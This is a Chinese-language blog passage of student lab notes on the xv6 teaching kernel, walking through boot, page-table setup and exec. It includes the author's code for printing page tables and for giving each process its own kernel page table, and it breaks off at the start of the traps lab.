<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(LAB_PGTBL) || defined(LAB_LOCK)</span></span><br><span class="line">    statsinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAB_NET</span></span><br><span class="line">    pci_init();</span><br><span class="line">    sockinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上一个函数设置好内核页表之后，这个函数就是让<code>satp</code>寄存器指向这个页表，到这里cpu才开启了虚拟内存，之前全部都是直接在物理内存上干的。</p>
<p>当开始虚拟地址之前，pc寄存器记录着下一个指令的物理地址，当开启了之后，pc寄存器就记录着下一个指令的虚拟地址，就需要翻译了，但由于xv6操作系统是采用直接映射的，所以开了和没开差不多✌</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kvminithart()</span><br><span class="line">&#123;</span><br><span class="line">  w_satp(MAKE_SATP(kernel_pagetable));</span><br><span class="line">  sfence_vma();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后又调用<code>procinit</code>函数,这个函数就是遍历所有的进程的proc结构体，然后利用kalloc申请一个页表，不过我稍微有问题的就是kalloc返回的是虚拟地址，虽说是直接映射，但是他直接默认成物理地址了，还是不太严谨，容易产生误导。然后利用<code>KSTACK</code>计算出这个进程的内核栈的虚拟地址，然后调用<code>kvmmap</code>进行映射。</p>
<p>退出for循环之后还得调用<code>kvminithart</code>函数，因为已经更改了页表，就必须刷新TLB，不然可能会映射出错，而这个函数中的<code>sfence_vma</code>函数调用会执行<code>sfence.vma</code>指令，这个指令就会刷新TLB</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  </span><br><span class="line">  initlock(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      initlock(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate a page for the process&#x27;s kernel stack.</span></span><br><span class="line">      <span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line">      <span class="comment">// guard page.</span></span><br><span class="line">      <span class="keyword">char</span> *pa = kalloc();</span><br><span class="line">      <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">      uint64 va = KSTACK((<span class="keyword">int</span>) (p - proc));</span><br><span class="line">      kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">      p-&gt;kstack = va;</span><br><span class="line">  &#125;</span><br><span class="line">  kvminithart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>物理内存分配</p>
<p>分配器的代码主要集中在<code>kalloc.c</code>文件中，之前已经分析过了，在main函数中会调用<code>kinit</code>函数来初始化分配器,看着还是比较清楚地，就是把地址空间中从内核末尾到<code>PHYSTOP</code>的地址按每一页进行free,然后放到<code>freelist</code>中了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exec代码分析"><a href="#exec代码分析" class="headerlink" title="exec代码分析"></a>exec代码分析</h4><p>exec函数是创建用户地址空间时使用的系统调用，在代码中侧重关注对elf文件的解析以及如何创建进程的地址空间。</p>
<p>函数首先经过一系列处理把elf头读到elf变量中，然后对魔数进行判断，然后调用<code>proc_pagetable(p)</code>返回个一个新的页表，这个页表中已经映射了跳板和陷阱帧。然后就是利用一个for循环把程序装载到内存中并配置页表，其中<code>uvmalloc</code>函数就是申请内存页然后配置页表，然后<code>loadseg</code>函数就是把二进制程序加载到申请的内存页中，大概是这样，但是具体如何加载elf每个段的还是看不太懂。</p>
<p>之后就是设置进程的栈，然后初始化了栈，在里面放了argc和argv,最后设置了陷阱帧的一些东西和页表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s, *last;</span><br><span class="line">  <span class="keyword">int</span> i, off;</span><br><span class="line">  uint64 argc, sz = <span class="number">0</span>, sp, ustack[MAXARG+<span class="number">1</span>], stackbase;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> <span class="title">elf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> <span class="title">ph</span>;</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>)&#123;</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ilock(ip);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check ELF header</span></span><br><span class="line">  <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;elf, <span class="number">0</span>, <span class="keyword">sizeof</span>(elf)) != <span class="keyword">sizeof</span>(elf))</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(elf.magic != ELF_MAGIC)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load program into memory.</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>, off=elf.phoff; i&lt;elf.phnum; i++, off+=<span class="keyword">sizeof</span>(ph))&#123;</span><br><span class="line">    <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.type != ELF_PROG_LOAD)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span>(ph.memsz &lt; ph.filesz)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    uint64 sz1;</span><br><span class="line">    <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sz = sz1;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">  &#125;</span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  end_op();</span><br><span class="line">  ip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = myproc();</span><br><span class="line">  uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line">  <span class="comment">// Use the second as the user stack.</span></span><br><span class="line">  sz = PGROUNDUP(sz);</span><br><span class="line">  uint64 sz1;</span><br><span class="line">  <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, sz + <span class="number">2</span>*PGSIZE)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  sz = sz1;</span><br><span class="line">  uvmclear(pagetable, sz<span class="number">-2</span>*PGSIZE);</span><br><span class="line">  sp = sz;</span><br><span class="line">  stackbase = sp - PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Push argument strings, prepare rest of stack in ustack.</span></span><br><span class="line">  <span class="keyword">for</span>(argc = <span class="number">0</span>; argv[argc]; argc++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &gt;= MAXARG)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sp -= <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>;</span><br><span class="line">    sp -= sp % <span class="number">16</span>; <span class="comment">// riscv sp must be 16-byte aligned</span></span><br><span class="line">    <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    ustack[argc] = sp;</span><br><span class="line">  &#125;</span><br><span class="line">  ustack[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// push the array of argv[] pointers.</span></span><br><span class="line">  sp -= (argc+<span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64);</span><br><span class="line">  sp -= sp % <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, sp, (<span class="keyword">char</span> *)ustack, (argc+<span class="number">1</span>)*<span class="keyword">sizeof</span>(uint64)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// arguments to user main(argc, argv)</span></span><br><span class="line">  <span class="comment">// argc is returned via the system call return</span></span><br><span class="line">  <span class="comment">// value, which goes in a0.</span></span><br><span class="line">  p-&gt;trapframe-&gt;a1 = sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Save program name for debugging.</span></span><br><span class="line">  <span class="keyword">for</span>(last=s=path; *s; s++)</span><br><span class="line">    <span class="keyword">if</span>(*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      last = s+<span class="number">1</span>;</span><br><span class="line">  safestrcpy(p-&gt;name, last, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp; <span class="comment">// initial stack pointer</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line"> bad:</span><br><span class="line">  <span class="keyword">if</span>(pagetable)</span><br><span class="line">    proc_freepagetable(pagetable, sz);</span><br><span class="line">  <span class="keyword">if</span>(ip)&#123;</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h3><p>打印页表,写的比较脑瘫</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _vmprint(<span class="keyword">pagetable_t</span> pagetable,<span class="keyword">int</span> level)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(level==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">2</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. ..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">3</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. .. ..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: %p pa %p\n&quot;</span>,i,pte,PTE2PA(pte));</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_X|PTE_W|PTE_R))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      _vmprint((<span class="keyword">pagetable_t</span>)child,level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">  _vmprint(pagetable,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h3><p>给每个进程实现一个内核页表的副本，只要理清思路就不难，然后代码实现仿照内核已有的函数写就行，我主要是卡在了<code>scheduler()</code>函数上，正确函数调用顺序如下,但是我刚开始吧<code>uvminithart</code>写在了<code>swtch</code>函数的下面，目前并不清楚这个函数是干啥的，但是按照这样写就没问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uvminithart(p-&gt;kernelpage);</span><br><span class="line"></span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure>

<p>主要代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_kernelpage_free</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=kernelpage[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_W|PTE_R|PTE_X))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      proc_kernelpage_free((<span class="keyword">pagetable_t</span>)child);</span><br><span class="line">    &#125;</span><br><span class="line">    kernelpage[i]=<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree((<span class="keyword">void</span> *)kernelpage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmmap</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage,uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernelpage,va,sz,pa,perm)!=<span class="number">0</span>)&#123;</span><br><span class="line">    panic(<span class="string">&quot;uvmmap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">pagetable_t</span> <span class="title">proc_kvminit</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">pagetable_t</span> kernlepage=(<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernlepage,<span class="number">0</span>,PGSIZE);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,(uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">  <span class="keyword">return</span> kernlepage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin</code>/<code>copyinstr</code></h3><p>代码太多了，把握的不是很好，加上没有善于利用git,导致我第二个实验做完没有开保存到工作区，最后实验三改着改着就改不回来了，我刚开始的思路就是用户页表映射的时候内核页表也跟着映射吗，但是最后是失败的，因为fork完后调用exec会导致对内核页表的重新映射而导致出错，进而程序崩溃，后来看了别人的思路，就是不利用内核提供的函数，而是自己写一个函数，来复制页表，这样确实会好很多，哎。猪鼻了这下。只能从头开始写这个实验了。</p>
<p>整了四五天还是疯狂报错。我吐了，照着写代码都不行，这个实验只能暂时搁浅了，后面有时间再整吧。</p>
<h2 id="Lab4-traps"><a href="#Lab4-traps" class="headerlink" title="Lab4: traps"></a>Lab4: traps</h2><h3 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h3><p>任务就是读懂这段汇编，但是之间没有认真接触过risc-v指令集，所以还是有些小困难，为了彻底搞懂，就从main处一行一行看吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 